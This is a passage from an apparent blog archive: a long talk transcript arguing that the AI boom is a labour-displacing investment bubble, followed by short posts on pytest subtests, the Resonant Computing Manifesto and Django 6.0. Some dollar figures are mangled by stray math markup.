is a peripheral for a van, and the van drives the driver, at superhuman speed, demanding superhuman endurance. But the driver is human, so the van doesn't just use the driver. The van uses the driver up. Obviously, it's nice to be a centaur, and it's horrible to be a reverse centaur. There are lots of AI tools that are potentially very centaur-like, but my thesis is that these tools are created and funded for the express purpose of creating reverse-centaurs, which is something none of us want to be. But like I said, the job of an sf writer is to do more than think about what the gadget does, and drill down on who the gadget does it for and who the gadget does it to. Tech bosses want us to believe that there is only one way a technology can be used. Mark Zuckerberg wants you to think that it's technologically impossible to have a conversation with a friend without him listening in. Tim Cook wants you to think that it's technologically impossible for you to have a reliable computing experience unless he gets a veto over which software you install and without him taking 30 cents out of every dollar you spend. Sundar Pichai wants you think that it's impossible for you to find a webpage unless he gets to spy on you from asshole to appetite. This is all a kind of vulgar Thatcherism. Margaret Thatcher's mantra was &quot;There is no alternative.&quot; She repeated this so often they called her &quot;TINA&quot; Thatcher: There. Is. No. Alternative. TINA. &quot;There is no alternative&quot; is a cheap rhetorical slight. It's a demand dressed up as an observation. &quot;There is no alternative&quot; means &quot;STOP TRYING TO THINK OF AN ALTERNATIVE.&quot; Which, you know, fuck that. I'm an sf writer, my job is to think of a dozen alternatives before breakfast. So let me explain what I think is going on here with this AI bubble, and sort out the bullshit from the material reality, and explain how I think we could and should all be better AI critics. # Start with monopolies: tech companies are gigantic and they don't compete, they just take over whole sectors, either on their own or in cartels. Google and Meta control the ad market. Google and Apple control the mobile market, and Google pays Apple more than <span class="math inline">\(20 billion/year not to make a competing search engine, and of course, Google has a 90% Search market-share. Now, you'd think that this was good news for the tech companies, owning their whole sector. But it's actually a crisis. You see, when a company is growing, it is a "growth stock," and investors really like growth stocks. When you buy a share in a growth stock, you're making a bet that it will continue to grow. So growth stocks trade at a huge multiple of their earnings. This is called the "price to earnings ratio" or "P/E ratio." But once a company stops growing, it is a "mature" stock, and it trades at a much lower P/E ratio. So for every dollar that Target – a mature company – brings in, it is worth ten dollars. It has a P/E ratio of 10, while Amazon has a P/E ratio of 36, which means that for every dollar Amazon brings in, the market values it at \)</span>36. It's wonderful to run a company that's got a growth stock. Your shares are as good as money. If you want to buy another company, or hire a key worker, you can offer stock instead of cash. And stock is very easy for companies to get, because shares are manufactured right there on the premises, all you have to do is type some zeroes into a spreadsheet, while dollars are much harder to come by. A company can only get dollars from customers or creditors. So when Amazon bids against Target for a key acquisition, or a key hire, Amazon can bid with shares they make by typing zeroes into a spreadsheet, and Target can only bid with dollars they get from selling stuff to us, or taking out loans, which is why Amazon generally wins those bidding wars. That's the upside of having a growth stock. But here's the downside: eventually a company has to stop growing. Like, say you get a 90% market share in your sector, how are you gonna grow? Once the market decides that you aren't a growth stock, once you become mature, your stock is revalued, to a P/E ratio befitting a mature stock. If you are an exec at a dominant company with a growth stock, you have to live in constant fear that the market will decide that you're not likely to grow any further. Think of what happened to Facebook in the first quarter of 2022. They told investors that they experienced slightly slower growth in the USA than they had anticipated, and investors panicked. They staged a one-day, <span class="math inline">\(240B sell off. A quarter-trillion dollars in 24 hours! At the time, it was the largest, most precipitous drop in corporate valuation in human history. That's a monopolist's worst nightmare, because once you're presiding over a "mature" firm, the key employees you've been compensating with stock, experience a precipitous pay-drop and bolt for the exits, so you lose the people who might help you grow again, and you can only hire their replacements with dollars. With dollars, not shares. And the same goes for acquiring companies that might help you grow, because they, too, are going to expect money, not stock. This is the paradox of the growth stock. While you are growing to domination, the market loves you, but once you achieve dominance, the market lops 75% or more off your value in a single stroke if they don't trust your pricing power. Which is why growth stock companies are always desperately pumping up one bubble or another, spending billions to hype the pivot to video, or cryptocurrency, or NFTs, or Metaverse, or AI. I'm not saying that tech bosses are making bets they don't plan on winning. But I am saying that winning the bet – creating a viable metaverse – is the secondary goal. The primary goal is to keep the market convinced that your company will continue to grow, and to remain convinced until the next bubble comes along. So this is why they're hyping AI: the material basis for the hundreds of billions in AI investment. # Now I want to talk about how they're selling AI. The growth narrative of AI is that AI will disrupt labor markets. I use "disrupt" here in its most disreputable, tech bro sense. The promise of AI – the promise AI companies make to investors – is that there will be AIs that can do your job, and when your boss fires you and replaces you with AI, he will keep half of your salary for himself, and give the other half to the AI company. That's it. That's the \)</span>13T growth story that MorganStanley is telling. It's why big investors and institutionals are giving AI companies hundreds of billions of dollars. And because they are piling in, normies are also getting sucked in, risking their retirement savings and their family's financial security. Now, if AI could do your job, this would still be a problem. We'd have to figure out what to do with all these technologically unemployed people. But AI can't do your job. It can help you do your job, but that doesn't mean it's going to save anyone money. Take radiology: there's some evidence that AIs can sometimes identify solid-mass tumors that some radiologists miss, and look, I've got cancer. Thankfully, it's very treatable, but I've got an interest in radiology being as reliable and accurate as possible. If my Kaiser hospital bought some AI radiology tools and told its radiologists: &quot;Hey folks, here's the deal. Today, you're processing about 100 x-rays per day. From now on, we're going to get an instantaneous second opinion from the AI, and if the AI thinks you've missed a tumor, we want you to go back and have another look, even if that means you're only processing 98 x-rays per day. That's fine, we just care about finding all those tumors.&quot; If that's what they said, I'd be delighted. But no one is investing hundreds of billions in AI companies because they think AI will make radiology more expensive, not even if that also makes radiology more accurate. The market's bet on AI is that an AI salesman will visit the CEO of Kaiser and make this pitch: &quot;Look, you fire 9/10s of your radiologists, saving <span class="math inline">\(20m/year, you give us \)</span>10m/year, and you net <span class="math inline">\(10m/year, and the remaining radiologists' job will be to oversee the diagnoses the AI makes at superhuman speed, and somehow remain vigilant as they do so, despite the fact that the AI is usually right, except when it's catastrophically wrong. "And if the AI misses a tumor, this will be the human radiologist's fault, because they are the 'human in the loop.' It's their signature on the diagnosis." This is a reverse centaur, and it's a specific kind of reverse-centaur: it's what Dan Davies calls an "accountability sink." The radiologist's job isn't really to oversee the AI's work, it's to take the blame for the AI's mistakes. This is another key to understanding – and thus deflating – the AI bubble. The AI can't do your job, but an AI salesman can convince your boss to fire you and replace you with an AI that can't do your job. This is key because it helps us build the kinds of coalitions that will be successful in the fight against the AI bubble. If you're someone who's worried about cancer, and you're being told that the price of making radiology too cheap to meter, is that we're going to have to re-home America's 32,000 radiologists, with the trade-off that no one will ever be denied radiology services again, you might say, "Well, OK, I'm sorry for those radiologists, and I fully support getting them job training or UBI or whatever. But the point of radiology is to fight cancer, not to pay radiologists, so I know what side I'm on." AI hucksters and their customers in the C-suites want the public on their side. They want to forge a class alliance between AI deployers and the people who enjoy the fruits of the reverse centaurs' labor. They want us to think of ourselves as enemies to the workers. Now, some people will be on the workers' side because of politics or aesthetics. They just like workers better than their bosses. But if you want to win over all the people who benefit from your labor, you need to understand and stress how the products of the AI will be substandard. That they are going to get charged more for worse things. That they have a shared material interest with you. Will those products be substandard? There's every reason to think so. Earlier, I alluded to "automation blindness, "the physical impossibility of remaining vigilant for things that rarely occur. This is why TSA agents are incredibly good at spotting water bottles. Because they get a ton of practice at this, all day, every day. And why they fail to spot the guns and bombs that government red teams smuggle through checkpoints to see how well they work, because they just don't have any practice at that. Because, to a first approximation, no one deliberately brings a gun or a bomb through a TSA checkpoint. Automation blindness is the Achilles' heel of "humans in the loop." Think of AI software generation: there are plenty of coders who love using AI, and almost without exception, they are senior, experienced coders, who get to decide how they will use these tools. For example, you might ask the AI to generate a set of CSS files to faithfully render a web-page across multiple versions of multiple browsers. This is a notoriously fiddly thing to do, and it's pretty easy to verify if the code works – just eyeball it in a bunch of browsers. Or maybe the coder has a single data file they need to import and they don't want to write a whole utility to convert it. Tasks like these can genuinely make coders more efficient and give them more time to do the fun part of coding, namely, solving really gnarly, abstract puzzles. But when you listen to business leaders talk about their AI plans for coders, it's clear they're not looking to make some centaurs. They want to fire a lot of tech workers – they've fired 500,000 over the past three years – and make the rest pick up their work with coding, which is only possible if you let the AI do all the gnarly, creative problem solving, and then you do the most boring, soul-crushing part of the job: reviewing the AIs' code. And because AI is just a word guessing program, because all it does is calculate the most probable word to go next, the errors it makes are especially subtle and hard to spot, because these bugs are literally statistically indistinguishable from working code (except that they're bugs). Here's an example: code libraries are standard utilities that programmers can incorporate into their apps, so they don't have to do a bunch of repetitive programming. Like, if you want to process some text, you'll use a standard library. If it's an HTML file, that library might be called something like lib.html.text.parsing; and if it's a DOCX file, it'll be lib.docx.text.parsing. But reality is messy, humans are inattentive and stuff goes wrong, so sometimes, there's another library, this one for parsing PDFs, and instead of being called lib.pdf.text.parsing, it's called lib.text.pdf.parsing. Now, because the AI is a statistical inference engine, because all it can do is predict what word will come next based on all the words that have been typed in the past, it will "hallucinate" a library called lib.pdf.text.parsing. And the thing is, malicious hackers know that the AI will make this error, so they will go out and create a library with the predictable, hallucinated name, and that library will get automatically sucked into your program, and it will do things like steal user data or try and penetrate other computers on the same network. And you, the human in the loop – the reverse centaur – you have to spot this subtle, hard to find error, this bug that is literally statistically indistinguishable from correct code. Now, maybe a senior coder could catch this, because they've been around the block a few times, and they know about this tripwire. But guess who tech bosses want to preferentially fire and replace with AI? Senior coders. Those mouthy, entitled, extremely highly paid workers, who don't think of themselves as workers. Who see themselves as founders in waiting, peers of the company's top management. The kind of coder who'd lead a walkout over the company building drone-targeting systems for the Pentagon, which cost Google ten billion dollars in 2018. For AI to be valuable, it has to replace high-wage workers, and those are precisely the experienced workers, with process knowledge, and hard won intuition, who might spot some of those statistically camouflaged AI errors. Like I said, the point here is to replace high-waged workers. And one of the reasons the AI companies are so anxious to fire coders is that coders are the princes of labor. They're the most consistently privileged, sought-after, and well-compensated workers in the labor force. If you can replace coders with AI, who cant you replace with AI? Firing coders is an ad for AI. Which brings me to AI art. AI art – or "art" – is also an ad for AI, but it's not part of AI's business model. Let me explain: on average, illustrators don't make any money. They are already one of the most immiserated, precarized groups of workers out there. They suffer from a pathology called "vocational awe." That's a term coined by the librarian Fobazi Ettarh, and it refers to workers who are vulnerable to workplace exploitation because they actually care about their jobs – nurses, librarians, teachers, and artists. If AI image generators put every illustrator working today out of a job, the resulting wage-bill savings would be undetectable as a proportion of all the costs associated with training and operating image-generators. The total wage bill for commercial illustrators is less than the kombucha bill for the company cafeteria at just one of Open AI's campuses. The purpose of AI art – and the story of AI art as a death-knell for artists – is to convince the broad public that AI is amazing and will do amazing things. It's to create buzz. Which is not to say that it's not disgusting that former OpenAI CTO Mira Murati told a conference audience that "some creative jobs shouldn't have been there in the first place," and that it's not especially disgusting that she and her colleagues boast about using the work of artists to ruin those artists' livelihoods. It's supposed to be disgusting. It's supposed to get artists to run around and say, "The AI can do my job, and it's going to steal my job, and isn't that terrible?" Because the customers for AI – corporate bosses – don't see AI taking workers' jobs as terrible. They see it as wonderful. But can AI do an illustrator's job? Or any artist's job? Let's think about that for a second. I've been a working artist since I was 17 years old, when I sold my first short story, and I've given it a lot of thought, and here's what I think art is: it starts with an artist, who has some vast, complex, numinous, irreducible feeling in their mind. And the artist infuses that feeling into some artistic medium. They make a song, or a poem, or a painting, or a drawing, or a dance, or a book, or a photograph. And the idea is, when you experience this work, a facsimile of the big, numinous, irreducible feeling will materialize in your mind. Now that I've defined art, we have to go on a little detour. I have a friend who's a law professor, and before the rise of chatbots, law students knew better than to ask for reference letters from their profs, unless they were a really good student. Because those letters were a pain in the ass to write. So if you advertised for a postdoc and you heard from a candidate with a reference letter from a respected prof, the mere existence of that letter told you that the prof really thought highly of that student. But then we got chatbots, and everyone knows that you generate a reference letter by feeding three bullet points to an LLM, and it'll barf up five paragraphs of florid nonsense about the student. So when my friend advertises for a postdoc, they are flooded with reference letters, and they deal with this flood by feeding all these letters to another chatbot, and ask it to reduce them back to three bullet points. Now, obviously, they won't be the same bullet-points, which makes this whole thing terrible. But just as obviously, nothing in that five-paragraph letter except the original three bullet points are relevant to the student. The chatbot doesn't know the student. It doesn't know anything about them. It cannot add a single true or useful statement about the student to the letter. What does this have to do with AI art? Art is a transfer of a big, numinous, irreducible feeling from an artist to someone else. But the image-gen program doesn't know anything about your big, numinous, irreducible feeling. The only thing it knows is whatever you put into your prompt, and those few sentences are diluted across a million pixels or a hundred thousand words, so that the average communicative density of the resulting work is indistinguishable from zero. It's possible to infuse more communicative intent into a work: writing more detailed prompts, or doing the selective work of choosing from among many variants, or directly tinkering with the AI image after the fact, with a paintbrush or Photoshop or The Gimp. And if there will ever be a piece of AI art that is good art – as opposed to merely striking, or interesting, or an example of good draftsmanship – it will be thanks to those additional infusions of creative intent by a human. And in the meantime, it's bad art. It's bad art in the sense of being "eerie," the word Mark Fisher uses to describe "when there is something present where there should be nothing, or there is nothing present when there should be something." AI art is eerie because it seems like there is an intender and an intention behind every word and every pixel, because we have a lifetime of experience that tells us that paintings have painters, and writing has writers. But it's missing something. It has nothing to say, or whatever it has to say is so diluted that it's undetectable. The images were striking before we figured out the trick, but now they're just like the images we imagine in clouds or piles of leaves. We're the ones drawing a frame around part of the scene, we're the ones focusing on some contours and ignoring the others. We're looking at an inkblot, and it's not telling us anything. Sometimes that can be visually arresting, and to the extent that it amuses people in a community of prompters and viewers, that's harmless. I know someone who plays a weekly Dungeons and Dragons game over Zoom. It's transcribed by an open source model running locally on the dungeon master's computer, which summarizes the night's session and prompts an image generator to create illustrations of key moments. These summaries and images are hilarious because they're full of errors. It's a bit of harmless fun, and it bring a small amount of additional pleasure to a small group of people. No one is going to fire an illustrator because D&D players are image-genning funny illustrations where seven-fingered paladins wrestle with orcs that have an extra hand. But bosses have and will fire illustrators, because they fantasize about being able to dispense with creative professionals and just prompt an AI. Because even though the AI can't do the illustrator's job, an AI salesman can convince the illustrator's boss to fire them and replace them with an AI that can't do their job. This is a disgusting and terrible juncture, and we should not simply shrug our shoulders and accept Thatcherism's fatalism: "There is no alternative." So what is the alternative? A lot of artists and their allies think they have an answer: they say we should extend copyright to cover the activities associated with training a model. And I'm here to tell you they are wrong: wrong because this would inflict terrible collateral damage on socially beneficial activities, and it would represent a massive expansion of copyright over activities that are currently permitted – for good reason!. Let's break down the steps in AI training. First, you scrape a bunch of web-pages. This is unambiguously legal under present copyright law. You do not need a license to make a transient copy of a copyrighted work in order to analyze it, otherwise search engines would be illegal. Ban scraping and Google will be the last search engine we ever get, the Internet Archive will go out of business, that guy in Austria who scraped all the grocery store sites and proved that the big chains were colluding to rig prices would be in deep trouble. Next, you perform analysis on those works. Basically, you count stuff on them: count pixels and their colors and proximity to other pixels; or count words. This is obviously not something you need a license for. It's just not illegal to count the elements of a copyrighted work. And we really don't want it to be, not if you're interested in scholarship of any kind. And it's important to note that counting things is legal, even if you're working from an illegally obtained copy. Like, if you go to the flea market, and you buy a bootleg music CD, and you take it home and you make a list of all the adverbs in the lyrics, and you publish that list, you are not infringing copyright by doing so. Perhaps you've infringed copyright by getting the pirated CD, but not by counting the lyrics. This is why Anthropic offered a \)</span>1.5b settlement for training its models based on a ton of books it downloaded from a pirate site: not because counting the words in the books infringes anyone's rights, but because they were worried that they were going to get hit with <span class="math inline">\(150k/book statutory damages for downloading the files. OK, after you count all the pixels or the words, it's time for the final step: publishing them. Because that's what a model is: a literary work (that is, a piece of software) that embodies a bunch of facts about a bunch of other works, word and pixel distribution information, encoded in a multidimensional array. And again, copyright absolutely does not prohibit you from publishing facts about copyrighted works. And again, no one should want to live in a world where someone else gets to decide which truthful, factual statements you can publish. But hey, maybe you think this is all sophistry. Maybe you think I'm full of shit. That's fine. It wouldn't be the first time someone thought that. After all, even if I'm right about how copyright works now, there's no reason we couldn't change copyright to ban training activities, and maybe there's even a clever way to wordsmith the law so that it only catches bad things we don't like, and not all the good stuff that comes from scraping, analyzing and publishing. Well, even then, you're not gonna help out creators by creating this new copyright. If you're thinking that you can, you need to grapple with this fact: we have monotonically expanded copyright since 1976, so that today, copyright covers more kinds of works, grants exclusive rights over more uses, and lasts longer. And today, the media industry is larger and more profitable than it has ever been, and also: the share of media industry income that goes to creative workers is lower than its ever been, both in real terms, and as a proportion of those incredible gains made by creators' bosses at the media company. So how it is that we have given all these new rights to creators, and those new rights have generated untold billions, and left creators poorer? It's because in a creative market dominated by five publishers, four studios, three labels, two mobile app stores, and a single company that controls all the ebooks and audiobooks, giving a creative worker extra rights to bargain with is like giving your bullied kid more lunch money. It doesn't matter how much lunch money you give the kid, the bullies will take it all. Give that kid enough money and the bullies will hire an agency to run a global campaign proclaiming "think of the hungry kids! Give them more lunch money!" Creative workers who cheer on lawsuits by the big studios and labels need to remember the first rule of class warfare: things that are good for your boss are rarely what's good for you. The day Disney and Universal filed suit against Midjourney, I got a press release from the RIAA, which represents Disney and Universal through their recording arms. Universal is the largest label in the world. Together with Sony and Warner, they control 70% of all music recordings in copyright today. It starts: "There is a clear path forward through partnerships that both further AI innovation and foster human artistry." It ends: "This action by Disney and Universal represents a critical stand for human creativity and responsible innovation." And it's signed by Mitch Glazier, CEO of the RIAA. It's very likely that name doesn't mean anything to you. But let me tell you who Mitch Glazier is. Today, Mitch Glazier is the CEO if the RIAA, with an annual salary of \)</span>1.3m. But until 1999, Mitch Glazier was a key Congressional staffer, and in 1999, Glazier snuck an amendment into an unrelated bill, the Satellite Home Viewer Improvement Act, that killed musicians' right to take their recordings back from their labels. This is a practice that had been especially important to &quot;heritage acts&quot; (which is a record industry euphemism for &quot;old music recorded by Black people&quot;), for whom this right represented the difference between making rent and ending up on the street. When it became clear that Glazier had pulled this musician-impoverishing scam, there was so much public outcry, that Congress actually came back for a special session, just to vote again to cancel Glazier's amendment. And then Glazier was kicked out of his cushy Congressional job, whereupon the RIAA started paying him more than <span class="math inline">\(1m/year to "represent the music industry." This is the guy who signed that press release in my inbox. And his message was: The problem isn't that Midjourney wants to train a Gen AI model on copyrighted works, and then use that model to put artists on the breadline. The problem is that Midjourney didn't pay RIAA members Universal and Disney for permission to train a model. Because if only Midjourney had given Disney and Universal several million dollars for training rights to their catalogs, the companies would have happily allowed them to train to their heart's content, and they would have bought the resulting models, and fired as many creative professionals as they could. I mean, have we already forgotten the Hollywood strikes? I sure haven't. I live in Burbank, home to Disney, Universal and Warner, and I was out on the line with my comrades from the Writers Guild, offering solidarity on behalf of my union, IATSE 830, The Animation Guild, where I'm a member of the writers' unit. And I'll never forget when one writer turned to me and said, "You know, you prompt an LLM exactly the same way an exec gives shitty notes to a writers' room. You know: 'Make me ET, except it's about a dog, and put a love interest in there, and a car chase in the second act.' The difference is, you say that to a writers' room and they all make fun of you and call you a fucking idiot suit. But you say it to an LLM and it will cheerfully shit out a terrible script that conforms exactly to that spec (you know, Air Bud)." These companies are desperate to use AI to displace workers. When Getty Images sues AI companies, it's not representing the interests of photographers. Getty hates paying photographers! Getty just wants to get paid for the training run, and they want the resulting AI model to have guardrails, so it will refuse to create images that compete with Getty's images for anyone except Getty. But Getty will absolutely use its models to bankrupt as many photographers as it possibly can. A new copyright to train models won't get us a world where models aren't used to destroy artists, it'll just get us a world where the standard contracts of the handful of companies that control all creative labor markets are updated to require us to hand over those new training rights to those companies. Demanding a new copyright just makes you a useful idiot for your boss, a human shield they can brandish in policy fights, a tissue-thin pretense of "won't someone think of the hungry artists?" When really what they're demanding is a world where 30% of the investment capital of the AI companies go into their shareholders' pockets. When an artist is being devoured by rapacious monopolies, does it matter how they divvy up the meal? We need to protect artists from AI predation, not just create a new way for artists to be mad about their impoverishment. And incredibly enough, there's a really simple way to do that. After 20+ years of being consistently wrong and terrible for artists' rights, the US Copyright Office has finally done something gloriously, wonderfully right. All through this AI bubble, the Copyright Office has maintained – correctly – that AI-generated works cannot be copyrighted, because copyright is exclusively for humans. That's why the "monkey selfie" is in the public domain. Copyright is only awarded to works of human creative expression that are fixed in a tangible medium. And not only has the Copyright Office taken this position, they've defended it vigorously in court, repeatedly winning judgments to uphold this principle. The fact that every AI created work is in the public domain means that if Getty or Disney or Universal or Hearst newspapers use AI to generate works – then anyone else can take those works, copy them, sell them, or give them away for free. And the only thing those companies hate more than paying creative workers, is having other people take their stuff without permission. The US Copyright Office's position means that the only way these companies can get a copyright is to pay humans to do creative work. This is a recipe for centaurhood. If you're a visual artist or writer who uses prompts to come up with ideas or variations, that's no problem, because the ultimate work comes from you. And if you're a video editor who uses deepfakes to change the eyelines of 200 extras in a crowd-scene, then sure, those eyeballs are in the public domain, but the movie stays copyrighted. But creative workers don't have to rely on the US government to rescue us from AI predators. We can do it ourselves, the way the writers did in their historic writers' strike. The writers brought the studios to their knees. They did it because they are organized and solidaristic, but also are allowed to do something that virtually no other workers are allowed to do: they can engage in "sectoral bargaining," whereby all the workers in a sector can negotiate a contract with every employer in the sector. That's been illegal for most workers since the late 1940s, when the Taft-Hartley Act outlawed it. If we are gonna campaign to get a new law passed in hopes of making more money and having more control over our labor, we should campaign to restore sectoral bargaining, not to expand copyright. Our allies in a campaign to expand copyright are our bosses, who have never had our best interests at heart. While our allies in the fight for sector bargaining are every worker in the country. As the song goes, "Which side are you on?" OK, I need to bring this talk in for a landing now, because I'm out of time, so I'm going to close out with this: AI is a bubble and bubbles are terrible. Bubbles transfer the life's savings of normal people who are just trying to have a dignified retirement to the wealthiest and most unethical people in our society, and every bubble eventually bursts, taking their savings with it. But not every bubble is created equal. Some bubbles leave behind something productive. Worldcom stole billions from everyday people by defrauding them about orders for fiber optic cables. The CEO went to prison and died there. But the fiber outlived him. It's still in the ground. At my home, I've got 2gb symmetrical fiber, because AT&T lit up some of that old Worldcom dark fiber. All things being equal, it would have been better if Worldcom hadn't ever existed, but the only thing worse than Worldcom committing all that ghastly fraud would be if there was nothing to salvage from the wreckage. I don't think we'll salvage much from cryptocurrency, for example. Sure, there'll be a few coders who've learned something about secure programming in Rust. But when crypto dies, what it will leave behind is bad Austrian economics and worse monkey JPEGs. AI is a bubble and it will burst. Most of the companies will fail. Most of the data-centers will be shuttered or sold for parts. So what will be left behind? We'll have a bunch of coders who are really good at applied statistics. We'll have a lot of cheap GPUs, which'll be good news for, say, effects artists and climate scientists, who'll be able to buy that critical hardware at pennies on the dollar. And we'll have the open source models that run on commodity hardware, AI tools that can do a lot of useful stuff, like transcribing audio and video, describing images, summarizing documents, automating a lot of labor-intensive graphic editing, like removing backgrounds, or airbrushing passersby out of photos. These will run on our laptops and phones, and open source hackers will find ways to push them to do things their makers never dreamt of. If there had never been an AI bubble, if all this stuff arose merely because computer scientists and product managers noodled around for a few years coming up with cool new apps for back-propagation, machine learning and generative adversarial networks, most people would have been pleasantly surprised with these interesting new things their computers could do. We'd call them "plugins." It's the bubble that sucks, not these applications. The bubble doesn't want cheap useful things. It wants expensive, "disruptive" things: Big foundation models that lose billions of dollars every year. When the AI investment mania halts, most of those models are going to disappear, because it just won't be economical to keep the data-centers running. As Stein's Law has it: "Anything that can't go on forever eventually stops." The collapse of the AI bubble is going to be ugly. Seven AI companies currently account for more than a third of the stock market, and they endlessly pass around the same \)</span>100b IOU. Bosses are mass-firing productive workers and replacing them with janky AI, and when the janky AI is gone, no one will be able to find and re-hire most of those workers, we're going to go from dysfunctional AI systems to nothing. AI is the asbestos in the walls of our technological society, stuffed there with wild abandon by a finance sector and tech monopolists run amok. We will be excavating it for a generation or more. So we need to get rid of this bubble. Pop it, as quickly as we can. To do that, we have to focus on the material factors driving the bubble. The bubble isn't being driven by deepfake porn, or election disinformation, or AI image-gen, or slop advertising. All that stuff is terrible and harmful, but it's not driving investment. The total dollar figure represented by these apps doesn't come close to making a dent in the capital expenditures and operating costs of AI. They are peripheral, residual uses: flashy, but unimportant to the bubble. Get rid of all those uses and you reduce the expected income of AI companies by a sum so small it rounds to zero. Same goes for all that &quot;AI Safety&quot; nonsense, that purports to concern itself with preventing an AI from attaining sentience and turning us all into paperclips. First of all, this is facially absurd. Throwing more words and GPUs into the word-guessing program won't make it sentient. That's like saying, &quot;Well, we keep breeding these horses to run faster and faster, so it's only a matter of time until one of our mares gives birth to a locomotive.&quot; A human mind is not a word-guessing program with a lot of extra words. I'm here for science fiction thought experiments, don't get me wrong. But also, don't mistake sf for prophesy. SF stories about superintelligence are futuristic parables, not business plans, roadmaps, or predictions. The AI Safety people say they are worried that AI is going to end the world, but AI bosses love these weirdos. Because on the one hand, if AI is powerful enough to destroy the world, think of how much money it can make! And on the other hand, no AI business plan has a line on its revenue projections spreadsheet labeled &quot;Income from turning the human race into paperclips.&quot; So even if we ban AI companies from doing this, we won't cost them a dime in investment capital. To pop the bubble, we have to hammer on the forces that created the bubble: the myth that AI can do your job, especially if you get high wages that your boss can claw back; the understanding that growth companies need a succession of ever-more-outlandish bubbles to stay alive; the fact that workers and the public they serve are on one side of this fight, and bosses and their investors are on the other side. Because the AI bubble really is very bad news, it's worth fighting seriously, and a serious fight against AI strikes at its roots: the material factors fueling the hundreds of billions in wasted capital that are being spent to put us all on the breadline and fill all our walls with high-tech asbestos.

      <h1>TIL: Subtests in pytest 9.0.0+</h1>

(date: 2025-12-05)
      <p>
      <p><strong><a href="https://til.simonwillison.net/pytest/subtests">TIL: Subtests in pytest 9.0.0+</a></strong></p>
<p>I spotted an interesting new feature <a href="https://docs.pytest.org/en/stable/changelog.html#pytest-9-0-0-2025-11-05">in the release notes for pytest 9.0.0</a>: <a href="https://docs.pytest.org/en/stable/how-to/subtests.html#subtests">subtests</a>.</p>
<p>I'm a <em>big</em> user of the <a href="https://docs.pytest.org/en/stable/example/parametrize.html">pytest.mark.parametrize</a> decorator - see <a href="https://simonwillison.net/2018/Jul/28/documentation-unit-tests/">Documentation unit tests</a> from 2018 - so I thought it would be interesting to try out subtests and see if they're a useful alternative.</p>
<p>Short version: this parameterized test:</p>
<pre><code>@pytest.mark.parametrize(&quot;setting&quot;, app.SETTINGS)
def test_settings_are_documented(settings_headings, setting):
    assert setting.name in settings_headings
</code></pre>
<p>Becomes this using subtests instead:</p>
<pre><code>def test_settings_are_documented(settings_headings, subtests):
    for setting in app.SETTINGS:
        with subtests.test(setting=setting.name):
            assert setting.name in settings_headings
</code></pre>
<p>Why is this better? Two reasons:</p>
<ol>
<li>It appears to run a bit faster</li>
<li>Subtests can be created programatically after running some setup code first</li>
</ol>
<p>I <a href="https://gistpreview.github.io/?0487e5bb12bcbed850790a6324788e1b">had Claude Code</a> port <a href="https://github.com/simonw/datasette/pull/2609/files">several tests</a> to the new pattern. I like it.</p>

      <h1>The Resonant Computing Manifesto</h1>

(date: 2025-12-05)
      <p>
      <p><strong><a href="https://resonantcomputing.org/">The Resonant Computing Manifesto</a></strong></p>
<p>Launched today at WIRED’s <a href="https://events.wired.com/big-interview-2025">The Big Interview</a> event, this manifesto (of which I'm a founding signatory) encourages a positive framework for thinking about building hyper-personalized AI-powered software - while avoiding the attention hijacking anti-patterns that defined so much of the last decade of software design.</p>
<p>This part in particular resonates with me:</p>
<blockquote>
<p>For decades, technology has required standardized solutions to complex human problems. In order to scale software, you had to build for the average user, sanding away the edge cases. In many ways, this is why our digital world has come to resemble the sterile, deadening architecture that Alexander spent his career pushing back against.</p>
<p>This is where AI provides a missing puzzle piece. Software can now respond fluidly to the context and particularity of each human—at scale. One-size-fits-all is no longer a technological or economic necessity. Where once our digital environments inevitably shaped us against our will, we can now build technology that <em>adaptively shapes itself</em> in service of our individual and collective aspirations.</p>
</blockquote>
<p>There are echos here of the <a href="https://www.inkandswitch.com/essay/malleable-software/">Malleable software concept</a> from Ink &amp; Switch.</p>
<p>The manifesto proposes five principles for building resonant software: Keeping data <strong>private</strong> and under personal stewardship, building software that's <strong>dedicated</strong> to the user's interests, ensuring <strong>plural</strong> and distributed control rather than platform monopolies, making tools <strong>adaptable</strong> to individual context, and designing for <strong>prosocial</strong> membership of shared spaces.</p>
<p>Steven Levy talked to the manifesto's lead instigator Alex Komoroske and provides some extra flavor in <a href="https://www.wired.com/story/big-interview-event-techdirt-mike-masnick-common-tools-alex-komoroske/">It's Time to Save Silicon Valley From Itself</a>:</p>
<blockquote>
<p>By 2025, it was clear to Komoroske and his cohort that Big Tech had strayed far from its early idealistic principles. As Silicon Valley began to align itself more strongly with political interests, the idea emerged within the group to lay out a different course, and a casual suggestion led to a process where some in the group began drafting what became today’s manifesto. They chose the word “resonant” to describe their vision mainly because of its positive connotations. As the document explains, “It’s the experience of encountering something that speaks to our deeper values.”</p>

      <h1>Django 6.0 released</h1>

(date: 2025-12-04)
      <p>
      <p><strong><a href="https://www.djangoproject.com/weblog/2025/dec/03/django-60-released/">Django 6.0 released</a></strong></p>
<p>Django 6.0 includes a <a href="https://docs.djangoproject.com/en/6.0/releases/6.0/">flurry of neat features</a>, but the two that most caught my eye are <strong>background workers</strong> and <strong>template partials</strong>.</p>
<p>Background workers started out as <a href="https://github.com/django/deps/blob/main/accepted/0014-background-workers.rst">DEP (Django Enhancement Proposal) 14</a>, proposed and shepherded by Jake Howard. Jake prototyped the feature in <a href="https://github.com/RealOrangeOne/django-tasks">django-tasks</a> and wrote <a href="https://theorangeone.net/posts/django-dot-tasks-exists/">this extensive background on the feature</a> when it landed in core just in time for the 6.0 feature freeze back in September.</p>
<p>Kevin Wetzels published a useful <a href="https://roam.be/notes/2025/a-first-look-at-djangos-new-background-tasks/">first look at Django's background tasks</a> based on the earlier RC, including notes on building a custom database-backed worker implementation.</p>
<p><a href="https://docs.djangoproject.com/en/6.0/ref/templates/language/#template-partials">Template Partials</a> were implemented as a Google Summer of Code project by Farhan Ali Raza. I really like the design of this. Here's an example from <a href="https://docs.djangoproject.com/en/6.0/ref/templates/language/#inline-partials">the documentation</a> showing the neat <code>inline</code> attribute which lets you both use and define a partial at the same time:</p>
<pre><code>{# Define and render immediately. #}
{% partialdef user-info inline %}
    &lt;div id=&quot;user-info-{{ user.username }}&quot;&gt;
        &lt;h3&gt;{{ user.name }}&lt;/h3&gt;
        &lt;p&gt;{{ user.bio }}&lt;/p&gt;
    &lt;/div&gt;
{% endpartialdef %}

{# Other page content here. #}

{# Reuse later elsewhere in the template. #}
&lt;section class=&quot;featured-authors&quot;&gt;
    &lt;h2&gt;Featured Authors&lt;/h2&gt;
    {% for user in featured %}
        {% partial user-info %}
    {% endfor %}
